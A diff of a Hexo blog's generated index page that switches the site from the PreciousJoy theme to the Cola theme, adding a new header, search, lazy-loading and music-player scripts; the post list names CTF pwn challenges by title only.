+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
       </div>
-      
-
-
-      <div id="recent-posts-paginator">
-        <a class="extend prev" rel="prev" href="/page/4/"> </a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/6/"> </a>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
       </div>
-
     </div>
-
-<aside id="sidebar">
-  
-  <div class="widget-box">
-  	  <div class="widget-box">
-    <h3 class="widget-title-friends">friends</h3>
-    <div class="widget">
-      
-        <a class="friends-list-link" style="display: block;" href="https://fireworks99.github.io/" title target='_blank'
-        >fireworks99</a>
-      
-    </div>
-  </div>
-
-  </div>
-  
-  <div class="widget-box">
-  	
-
-  </div>
-  
-  <div class="widget-box">
-  	
-  <div class="widget-box">
-    <h3 class="widget-title-tag">tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-NewSar/" rel="tag">ctf-NewSar</a></li></ul>
-    </div>
-  </div>
-
-
-  </div>
-  
-  <div class="widget-box">
-  	
-  <div class="widget-box">
-    <h3 class="widget-title-archive">archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
-    </div>
-  </div>
-
-  </div>
-  
-  <div class="widget-box">
-  	
-  <div class="widget-box">
-    <h3 class="widget-title-post">recent_posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/26/FUZZ/xpdf/">xpdf</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/20/trick/">trick</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/20/trick/trick/">trick</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/18/qwnt2024/">qwnt2024</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/13/%E6%B2%99%E7%AE%B1/%E6%B2%99%E7%AE%B1/">沙箱</a>
-          </li>
-        
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://github.com/degial/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
       </ul>
     </div>
   </div>
+</header>
 
-  </div>
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"ACTF_2019_OneRepeater","path":"/posts/319d974/"},{"title":"ACTF_2019_message","path":"/posts/f5d1b033/"},{"title":"GUESS","path":"/posts/c587cd26/"},{"title":"NewStar","path":"/posts/d23e595a/"},{"title":"SWPUCTF_2019_p1KkHeap","path":"/posts/a25249b0/"},{"title":"SWPUCTF_2019_login","path":"/posts/61db3fed/"},{"title":"b00ks","path":"/posts/be955ceb/"},{"title":"b0verfl0w","path":"/posts/b656e51/"},{"title":"bad","path":"/posts/822b39fb/"},{"title":"babyheap_0ctf_2017","path":"/posts/1a2f921f/"},{"title":"bbctf_2020_write","path":"/posts/75171fcc/"},{"title":"ciscn_2019_c_3","path":"/posts/7d6af77/"},{"title":"ciscn_2019_c_5","path":"/posts/eeb50a42/"},{"title":"ciscn_2019_es_1","path":"/posts/90ce1974/"},{"title":"checkin","path":"/posts/e1631c91/"},{"title":"ciscn_2019_es_7","path":"/posts/79adbc41/"},{"title":"ciscn_final_2","path":"/posts/9a3dca0e/"},{"title":"ciscn_pwn","path":"/posts/344ab8fb/"},{"title":"ciscn_final_5","path":"/posts/4595fad/"},{"title":"easyshell","path":"/posts/9ea1a33f/"},{"title":"freenote_x64","path":"/posts/231495d9/"},{"title":"glibc","path":"/posts/58b6dd93/"},{"title":"gostack","path":"/posts/ad559ced/"},{"title":"heap","path":"/posts/bd2922e1/"},{"title":"hitcon2014_stkof","path":"/posts/78860fdf/"},{"title":"200~house_of_force","path":"/posts/a8db7475/"},{"title":"inndy_rop","path":"/posts/19fdcc0c/"},{"title":"","path":"/posts/0/"},{"title":"jiandan_pwn1","path":"/posts/595198b9/"},{"title":"heapcreator","path":"/posts/707c38cf/"},{"title":"lctf2016_pwn200","path":"/posts/6f5f7bb7/"},{"title":"level4","path":"/posts/7792b02a/"},{"title":"login","path":"/posts/aa08cb10/"},{"title":"mergeheap","path":"/posts/709727a2/"},{"title":"metasequoia_2020_samsara","path":"/posts/dff3306c/"},{"title":"note2","path":"/posts/c0d78a/"},{"title":"","path":"/posts/0/"},{"title":"python课设","path":"/posts/5eca8ee9/"},{"title":"overlapping_chunks","path":"/posts/37a70f1c/"},{"title":"qwnt2024","path":"/posts/a036fd99/"},{"title":"roarctf_2019_easypwn","path":"/posts/29aca647/"},{"title":"sctf2019_easy_heap","path":"/posts/b5a0cf5/"},{"title":"sctf_2019_easy_heap","path":"/posts/afe33925/"},{"title":"sleepyHolder_hitcon_2016","path":"/posts/b1e92899/"},{"title":"starctf_2019_girlfriend","path":"/posts/2672e039/"},{"title":"STKOF","path":"/posts/696f0fbd/"},{"title":"trick","path":"/posts/d8f0a91e/"},{"title":"stdout","path":"/posts/c2c94c1c/"},{"title":"","path":"/posts/0/"},{"title":"武功论剑","path":"/posts/6ca732a0/"},{"title":"解决libc6软件包和libc6-dev不匹配的问题","path":"/posts/24332419/"},{"title":"xpdf","path":"/posts/7e7e55f1/"},{"title":"CVE-2020-8423","path":"/posts/24932e9/"},{"title":"trick","path":"/posts/d8f0a91e/"},{"title":"沙箱","path":"/posts/fbdf783e/"},{"title":"","path":"/posts/0/"},{"title":"pstack","path":"/posts/3d6a2015/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">Cola.</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">中二</span>
+          <span class="main-left--tag">宅</span>
+        </div>
+      </div>
+    </div>
   
-</aside>
+    <div>
+      <div class="main-left--motto">
+        <p>“花有重开日，人无再少年”</p>
+        <p>“一个简单普通的男孩”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a href="https://github.com/Aizener"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>0</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>2</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>12 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
 
-<!-- <div id="paginator"> -->
-<!--   <a class="extend prev" rel="prev" href="/page/4/"> </a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/6/"> </a> -->
-<!-- </div> -->
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-          tex2jax: {
-            inlineMath: [ ['$','$'], ["\\(","\\)"] ],
-            processEscapes: true
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>57 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1033天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container"><link rel="stylesheet" href="/css/partial/index.css" />
+
+
+
+<div class="index">
+  <div class="index-left">
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="note2" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/c0d78a/">note2 </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="GUESS" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/c587cd26/">GUESS </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="b0verfl0w" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/b656e51/">b0verfl0w </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+  </div>
+  <div class="index-center">
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" data-cover="" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="ciscn_final_5" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/4595fad/">ciscn_final_5 </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" data-cover="" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="bad" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/822b39fb/">bad </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+  </div>
+  <div class="index-right">
+    <div class="index-right-wrapper">
+      
+      <ul class="tags" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-NewSar/" rel="tag">ctf-NewSar</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">2024年11月</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">2024年10月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">2024年09月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">2024年07月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">2024年05月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">2024年04月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">2024年03月</a><span class="archive-list-count">20</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">2024年02月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">2024年01月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">2023年12月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">2023年11月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">2023年10月</a><span class="archive-list-count">7</span></li></ul>
+    </div>
+  </div>
+</div>
+
+  <div class="page">
+    <a class="extend prev" rel="prev" href="/page/4/">&lt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/6/">&gt;</a>
+  </div>
+
+
+<script>
+  var allImgBoxs = document.querySelectorAll('.index-article--box');
+  var windowHeight = window.innerHeight;
+  var boxs = Array.from(allImgBoxs);
+  var timer = null;
+  boxs.forEach((box, idx) => {
+    if (!window.loadImageSet || !window.loadImageSet.includes(idx)) {
+      box.classList.add('img-loading');
+    } else {
+      const imgDom = box.querySelector('img');
+      imgDom.src = imgDom.dataset.cover;
+    }
+  });
+
+  function scrollFn() {
+    if (timer) {
+      return;
+    }
+    timer = setTimeout(() => {
+      loadImage();
+      timer = null;
+    }, 100)
+  }
+
+  setTimeout(() => {
+    loadImage();
+  }, 100);
+  if (!window.loadedImage) {
+    document.addEventListener('scroll', scrollFn);
+  }
+
+  function loadImage() {
+    const doc = document.documentElement;
+    const scrollTop = doc.scrollTop;
+    if (boxs.every(box => box.loadedImage)) {
+      document.removeEventListener('scroll', scrollFn);
+      window.loadedImage = 1;
+      return;
+    }
+    boxs.forEach((box, idx) => {
+      if (box.loadedImage) {
+        return;
+      }
+      if (box.getBoundingClientRect().top < windowHeight) {
+        const imgDom = box.querySelector('img');
+        imgDom.src = imgDom.dataset.cover;
+        // 图片成功加载
+        imgDom.onload = () => {
+          box.classList.remove('img-loading');
+          box.loadedImage = true;
+          if (!window.loadImageSet) {
+            window.loadImageSet = [];
           }
-        });
-      </script>
+          window.loadImageSet.push(idx);
+        }
+        // 图片加载失败
+        imgDom.onerror = () => {
+          box.classList.remove('img-loading');
+          box.classList.add('img-error');
+          imgDom.src = '/imgs/404.png';
+        }
+      }
+    });
+  }
+</script> </div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello~大噶好。唔系可乐爱宅着，欢迎你们来到我的博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-            tex2jax: {
-              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-            }
-          });
-      </script>
+  <div id="aplayer" class="main-right--music"></div>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-              var all = MathJax.Hub.getAllJax(), i;
-              for(i=0; i < all.length; i += 1) {
-                  all[i].SourceElement().parentNode.className += ' has-jax';
-              }
-          });
-    </script>
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
 
-    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">蜀ICP备2022005384号-1</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
 
 
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
 
-			</div>
-		</div>
-
-		<div id="bottom-outer">
-			<div id="bottom-inner">
-				Site by your name | 
-				Powered by <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a> |
-				theme <a target="_blank" rel="noopener" href="https://github.com/fireworks99/hexo-theme-PreciousJoy">PreciousJoy</a>
-			</div>
-		</div>
-
-		
-	</div>
-
-
-
-
-
-	
-	<!-- scripts list from theme config.yml -->
-	
-	<script src="/js/jquery-3.5.1.min.js"></script>
-	
-	<script src="/js/PreciousJoy.js"></script>
-	
-	<script src="/js/highlight.pack.js"></script>
-	
-	<script src="/js/jquery.fancybox.min.js"></script>
-	
-	<script src="/js/search.js"></script>
-	
-	<script src="/js/load.js"></script>
-	
-	<script src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
-	
-	<script src="/js/clipboard.min.js"></script>
-	
-	
-
-	<script>hljs.initHighlightingOnLoad();</script>
-
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
 </body>
 </html>
